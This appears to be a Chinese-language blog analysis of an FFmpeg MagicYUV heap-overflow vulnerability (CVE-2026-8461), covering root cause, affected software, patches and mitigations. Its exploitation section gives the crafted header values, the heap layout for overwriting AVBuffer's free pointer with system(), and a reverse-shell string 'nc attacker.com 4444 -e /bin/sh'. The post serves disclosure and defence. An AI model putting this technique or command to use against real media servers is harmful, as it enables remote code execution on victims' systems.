---
title: "PixelSmash（CVE-2026-8461）：一个 50KB 视频文件如何击穿 FFmpeg 生态"
published: 2026-07-19
description: "深度分析 JFrog 披露的 FFmpeg MagicYUV 解码器堆越界写漏洞，从根因到 RCE 利用链完整拆解，波及 Jellyfin、Nextcloud、Kodi、OBS 等数百个下游项目。"
tags: ["FFmpeg", "CVE", "漏洞分析", "RCE", "供应链安全", "PixelSmash"]
category: 安全
draft: false
image: "./cover.jpeg"
---

## 前言

2026 年 6 月 22 日，JFrog 安全研究团队披露了一个名为 **PixelSmash** 的漏洞，编号 **CVE-2026-8461**（CVSS 8.8）。漏洞位于 FFmpeg 的 MagicYUV 解码器中，是一个**堆越界写**（Heap Out-of-Bounds Write）。

FFmpeg 是什么？它是全球几乎所有多媒体软件的"幕后心脏"——Kodi、mpv、OBS、Jellyfin、Emby、Nextcloud 乃至 GNOME/KDE 的文件管理器缩略图生成器，底层都链接了 FFmpeg 的 `libavcodec`。这个漏洞不是某个应用的孤立 Bug，而是一场**软件供应链地震**。

更可怕的是攻击方式：攻击者只需上传一个 **50KB 的 AVI 文件**，当服务器自动扫描生成缩略图时，漏洞触发，代码执行——受害者无需播放视频、无需点击任何东西。

JFrog 在 Jellyfin 媒体服务器和 Nextcloud 私有云上均成功演示了完整的远程代码执行。

---

## 一、漏洞速览

| 维度 | 详情 |
|------|------|
| CVE 编号 | CVE-2026-8461 |
| 漏洞名称 | PixelSmash |
| 漏洞类型 | 堆越界写（Heap OOB Write） |
| CVSS 评分 | 8.8（High） |
| 影响组件 | FFmpeg MagicYUV 解码器（`libavcodec/magicyuv.c`） |
| 披露时间 | 2026 年 6 月 22 日 |
| 披露方 | JFrog Security Research |
| 利用条件 | 目标处理恶意 AVI/MKV/MOV 文件 |
| 默认启用 | 是（所有 FFmpeg 默认构建均包含 MagicYUV 解码器） |

---

## 二、受影响范围

### 2.1 直接受影响的应用

| 类别 | 受影响软件 |
|------|-----------|
| 媒体服务器 | Jellyfin、Emby、Plex |
| 桌面播放器 | Kodi、mpv、VLC |
| 直播/录制 | OBS Studio |
| 私有云/相册 | Nextcloud、Immich、PhotoPrism |
| 缩略图生成 | ffmpegthumbnailer（GNOME/KDE/XFCE 文件管理器） |
| 云转码 | AWS MediaConvert、Cloudflare Stream |

### 2.2 如何检测自身是否受影响

```bash
ffmpeg -decoders 2>/dev/null | grep magicyuv
```

如果输出包含 `VFS..D magicyuv`，说明你的 FFmpeg 构建包含该解码器，存在风险。

---

## 三、根因分析：一次舍入误差引发的血案

### 3.1 MagicYUV 解码器背景

MagicYUV 是一种无损视频编码格式，采用**横向切片**（Horizontal Slices）机制将一帧画面水平切分为多个切片并行解码，以提高性能。

视频编码通常使用 YUV 色彩空间，将图像分为三个平面：
- **Y 平面（亮度）**：人眼最敏感的灰度细节，全分辨率
- **U / V 平面（色度）**：颜色信息，在 YUV420P 格式下分辨率减半

当切片高度（`slice_height`）为奇数时，色度平面需要进行向上取整的右移运算：

```c
// 色度行数 = 向上取整(slice_height / 2)
int chroma_rows = AV_CEIL_RSHIFT(slice_height, 1);
```

### 3.2 漏洞核心：分配与使用的不一致

**第一步 —— 帧缓冲分配**（`update_frame_pool`）：

```c
// 帧高度对齐到 32，然后色度高度 = 对齐高度 / 2
allocated_chroma_rows = AV_CEIL_RSHIFT(FFALIGN(coded_height, 32), 1);
// coded_height = 32 → FFALIGN = 32 → allocated_rows = 16
```

色度平面缓冲只分配了 **16 行**。

**第二步 —— 解码器切片计算**（`magicyuv.c`）：

攻击者将 AVI 文件头中的 `slice_height` 设置为 `31`，`coded_height` 设置为 `32`：

```c
s->slice_height = 31;  // 从 AVI 比特流读取，攻击者完全可控
s->nb_slices = (32 + 31 - 1) / 31 = 2;  // 切成 2 个切片

// 每个切片色度高度
int sheight = AV_CEIL_RSHIFT(31, 1) = 16;  // 31/2 向上取整 = 16 行
```

**第三步 —— 越界写入**：

第二个切片的目标指针计算为：

```c
dst = chroma_plane + (slice_index * sheight * stride);
    = chroma_plane + (1 * 16 * stride);  // 从第 16 行开始写！
```

但缓冲只有 16 行（行号 0\~15），第 16 行已经越界。在 raw 模式下，解码器直接将攻击者控制的字节拷贝到越界区域：

```c
// magicyuv.c:291-294 — OOB WRITE
for (k = 0; k < sheight; k++) {
    bytestream_get_buffer(&slice, dst, chroma_width);  // 640 字节可控数据
    dst += stride;
}
```

ASAN 报告确认了这一定位：

```
WRITE of size 512 at 0x52500000214f
 #2 bytestream_get_buffer libavcodec/bytestream.h:367
 #3 magy_decode_slice libavcodec/magicyuv.c:292
0x52500000214f is located 0 bytes after 8271-byte region
```

### 3.3 为什么验证逻辑没拦住

`magicyuv.c:566` 处的 `slice_height` 校验**只在隔行扫描（interlaced）路径**执行：

```c
if (s->interlaced) {  // 仅隔行扫描模式
    if ((s->slice_height >> s->vshift[1]) < 2)
        ...
}
```

非隔行扫描路径没有任何对齐检查，攻击者只需在 AVI 头中将 interlaced 标志设为 0 即可绕过。

---

## 四、从越界写到代码执行：劫持 AVBuffer

堆越界写本身只能导致崩溃，如何变成代码执行取决于越界区域相邻的数据结构。在 FFmpeg 中，答案是 **AVBuffer**。

### 4.1 AVBuffer 结构

FFmpeg 用 `AVBuffer` 管理每个视频平面的像素数据缓冲，其中包含一个函数指针：

```c
typedef struct AVBuffer {
    uint8_t *data;      // 实际像素数据指针
    size_t size;        // 缓冲大小
    int refcount;       // 引用计数
    void (*free)(void *opaque, uint8_t *data);  // 释放回调函数指针
    void *opaque;       // 回调参数
} AVBuffer;
```

当帧解码完成，FFmpeg 调用 `av_frame_unref` → `av_buffer_unref`，引用计数减到 0 时触发：

```c
buf->free(buf->opaque, buf->data);  // 通过函数指针的间接调用
```

### 4.2 精确定向覆盖

在 Jellyfin 的堆布局中，640 字节的 OOB 写入恰好落在 `Cb` 色度平面的 `AVBuffer` 结构上：

```
OOB+0:   [88 字节全零 — 攻击者放置 shell 命令字符串]
OOB+88:  [glibc malloc chunk 元数据 — 必须原样保留]
OOB+256: AVBuffer:
  +256  .data      = Cb 数据指针
  +264  .size      = 0x284f
  +272  .refcount  = 1        ← 写 1，让减 1 后变 0
  +280  .free      = ← 覆盖为 libc 的 system() 地址
  +288  .opaque    = ← 覆盖为 OOB+0 的 shell 命令地址
```

### 4.3 完整攻击链

```
upload malicious.avi (50KB)
        ↓
Jellyfin library scan triggers ffmpeg thumbnail generation
        ↓
MagicYUV decoder parses crafted slice_height=31
        ↓
Heap OOB write: 640 bytes overwrite AVBuffer.free → &system()
                                    AVBuffer.opaque → &"nc attacker.com 4444 -e /bin/sh"
        ↓
av_frame_unref → av_buffer_unref → buf->free(buf->opaque, buf->data)
        ↓
system("nc attacker.com 4444 -e /bin/sh") executes
        ↓
Reverse shell to attacker
```

> **注意**：完整 RCE 演示在 ASLR 关闭的前提下完成。JFrog 同时披露了 FFmpeg FlashSV 解码器中的一个未初始化堆内存泄露漏洞，理论上可配合绕过 ASLR，但完整 ASLR 绕过尚未演示。

---

## 五、修复与缓解

### 5.1 升级（推荐）

升级到 FFmpeg 修复版本。MagicYUV 解码器在修复版本中添加了非隔行路径的 `slice_height` 边界检查。

### 5.2 禁用解码器（临时方案）

如需立即缓解，可重新编译 FFmpeg 并禁用 MagicYUV：

```bash
./configure --disable-decoder=magicyuv [其他选项]
make && make install
```

### 5.3 最小补丁

只需在 `libavcodec/magicyuv.c` 添加 7 行校验代码：

```c
if (s->slice_height <= 0 || s->slice_height > INT_MAX - avctx->coded_height) {
    av_log(avctx, AV_LOG_ERROR, "invalid slice height: %d\n", s->slice_height);
    return AVERROR_INVALIDDATA;
}
// 新增：非隔行路径的 slice 对齐检查
if ((s->slice_height >> s->vshift[1]) <= s->interlaced) {
    av_log(avctx, AV_LOG_ERROR, "impossible slice height\n");
    return AVERROR_INVALIDDATA;
}
```

---

## 六、启示：为什么媒体解码器是安全重灾区

PixelSmash 不是孤立事件。仅 2026 年 6 月，就有两个独立的安全研究团队在 FFmpeg 中挖掘出大量漏洞：

- **JFrog** 发现 PixelSmash（CVE-2026-8461）
- **DepthFirst** 使用自主 AI 安全智能体发现 **21 个零日漏洞**，其中 9 个已获 CVE 编号（CVE-2026-39210\~39218），包括潜伏 23 年的栈溢出（CVE-2026-39214）

根本原因在于：

1. **巨大的攻击面**：FFmpeg 有约 150 万行 C 代码，支持数百种编解码格式，每种格式的解析器都是攻击入口
2. **复杂的比特流解析**：视频编码涉及大量位级操作、长度计算、偏移对齐，极易出现 off-by-one 类错误
3. **默认全量编译**：几乎所有发行版的 FFmpeg 都默认启用全部解码器，即使 99% 的用户永远不会播放 MagicYUV 格式
4. **供应链放大效应**：FFmpeg 作为底层依赖，一个漏洞通过数百个下游项目指数级扩散

---

## 参考资源

- [JFrog 官方博客：PixelSmash 完整技术分析](https://jfrog.com/blog/pixelsmash-critical-ffmpeg-vulnerability-turns-media-files-into-weapons/)
- [CVE-2026-8461 NVD 页面](https://nvd.nist.gov/vuln/detail/CVE-2026-8461)
- [FFmpeg 官方安全公告](https://ffmpeg.org/security.html)
- [DepthFirst: 21 个 FFmpeg 零日漏洞披露](https://depthfirst.com/research/21-zero-days-in-ffmpeg)
